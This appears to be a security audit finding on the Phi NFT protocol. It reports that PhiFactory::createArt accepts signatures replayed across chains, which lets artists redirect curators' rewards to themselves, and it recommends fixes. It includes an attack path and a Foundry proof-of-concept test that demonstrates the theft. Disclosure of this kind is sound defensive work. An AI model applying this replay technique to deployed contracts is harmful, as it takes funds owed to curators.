# Vulnerability details

## Impact

Loss of funds: artists can set up their NFT contracts in a way that allows to completely deprive curators of their rewards; the rewards are redirected to the artist instead of curators.

## Summary

When setting up an NFT contract via [PhiFactory::createArt](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L196-L213), the artist supplies  `credData` as part of `signedData_`, which is validated to be signed by the Phi signing authority in [PhiFactory::_validateArtCreationSignature](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L589-L593). Unfortunately the latter is too simplistic, and validates only that the signature has not expired:

```solidity
function _validateArtCreationSignature(bytes calldata signedData_, bytes calldata signature_) private view {
    if (_recoverSigner(keccak256(signedData_), signature_) != phiSignerAddress) revert AddressNotSigned();
    (uint256 expiresIn_,,) = abi.decode(signedData_, (uint256, string, bytes));
    if (expiresIn_ <= block.timestamp) revert SignatureExpired();
}
```
In particular, the signed data doesn't include the chain id for which the signature has been issued. As a result, the signature obtained by an artist for one chain, can be employed on another chain.

Another crucial aspect worth noting is that it is beneficial for an artist to deploy the NFT contract on the chain which is different than the contract on which their credential is issued: in that case, the curators' rewards are redirected to the artist; see [PhiRewards::depositRewards](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/PhiRewards.sol#L108-L116):

```solidity
if (chainSync_ && address(curatorRewardsDistributor) != address(0)) {
    //slither-disable-next-line arbitrary-send-eth
    curatorRewardsDistributor.deposit{ value: curateTotalReward_ }(credId_, curateTotalReward_);
    rewardsData = abi.encode(artistTotalReward_, referralTotalReward_, verifierTotalReward_, curateTotalReward_);
} else {
    balanceOf[receiver_] += curateTotalReward_;
    rewardsData =
        abi.encode(artistTotalReward_ + curateTotalReward_, referralTotalReward_, verifierTotalReward_, 0);
}
```

This function is called from [PhiRewards::handleRewardsAndGetValueSent](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/reward/PhiRewards.sol#L123C14-L148), which is in turn is called from [PhiNFT1155::claimFromFactory](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/art/PhiNFT1155.sol#L186-L188) as follows:

```solidity
IPhiRewards(payable(phiFactoryContract.phiRewardsAddress())).handleRewardsAndGetValueSent{ value: msg.value }(
    artId_, credId, quantity_, mintFee(tokenId_), addressesData_, credChainId == block.chainid
);
```

As can be seen, in case the credentials employed in the `PhiNFT1155` contract (which are supplied upon contract creation via `PhiFactory::createArt`) are from a different chain than the current one, curators' rewards are redirected to the artist instead. To summarize:

**Root cause** is two-fold:

- `PhiFactory::_validateArtCreationSignature` doesn't validate `chainId`, which allows for cross-chain signature replay;
- `PhiFactory::createArt` doesn't validate if the artist possesses the credential identity on this chain, and allows to employ the one from any chain. 

**Attack path**: the artists can employ the following strategy to always receive curators' rewards instead of curators themselves:

- The artist employs two credential identities on two different chains;
- When creating NFT contracts, the artist always supplies the credentials from a different chain.


## Proof of Concept

Drop this test to [PhiFactory.t.sol](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/test/PhiFactory.t.sol#L163) and execute via `forge test --match-test Kuprum`

```solidity
function testKuprum_createArtSignatureReplay() public {
    // The credentials are from another chain
    uint256 otherChainId = 99999;
    assertNotEq(otherChainId, block.chainid);
    bytes memory credData = abi.encode(1, owner, "SIGNATURE", otherChainId, bytes32(0));
    bytes memory signCreateData = abi.encode(expiresIn, ART_ID_URL_STRING, credData);
    bytes32 createMsgHash = keccak256(signCreateData);
    bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
    (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
    if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
    IPhiFactory.CreateConfig memory config =
        IPhiFactory.CreateConfig(artCreator, receiver, END_TIME, START_TIME, MAX_SUPPLY, MINT_FEE, false);
    
    // createArt doesn't verify for which chain the signature has been issued
    phiFactory.createArt{ value: NFT_ART_CREATE_FEE }(signCreateData, abi.encodePacked(cr, cs), config);
    
    // Claiming process is standard, happens on this chain
    uint256 artId = 1;
    bytes memory signData =
        abi.encode(expiresIn, participant, referrer, verifier, artId, block.chainid, bytes32("1"));
    bytes32 msgHash = keccak256(signData);
    bytes32 digest = ECDSA.toEthSignedMessageHash(msgHash);
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(claimSignerPrivateKey, digest);
    if (v != 27) s = s | bytes32(uint256(1) << 255);
    bytes memory signature = abi.encodePacked(r, s);
    bytes memory data =
        abi.encode(1, participant, referrer, verifier, expiresIn, uint256(1), bytes32("1"), IMAGE_URL, signature);
    bytes memory dataCompressed = LibZip.cdCompress(data);

    vm.startPrank(participant, participant);
    phiFactory.claim{ value: phiFactory.getArtMintFee(1, 1) }(dataCompressed);

    // The artist receives also curators' reward
    uint256 totalReward = phiFactory.artData(artId).mintFee + ARTIST_REWARD + CURATE_REWARD;
    assertEq(phiRewards.balanceOf(receiver), totalReward);
    assertEq(curatorRewardsDistributor.balanceOf(1), 0, "curators don't get any reward");
}
```

## Recommended Mitigation Steps

We recommend the following:

- In the `signedData_` used in [PhiFactory::createArt()](https://github.com/code-423n4/2024-08-phi/blob/8c0985f7a10b231f916a51af5d506dd6b0c54120/src/PhiFactory.sol#L196-L213) introduce additionally the `chainId` parameter, and validate that the signature is designated for this chain;
- Account for the set of credentials possessed by an artist on different chains;
- In case an artist wants to create an NFT contract where they have an identity already, require them to employ the identity from this chain.
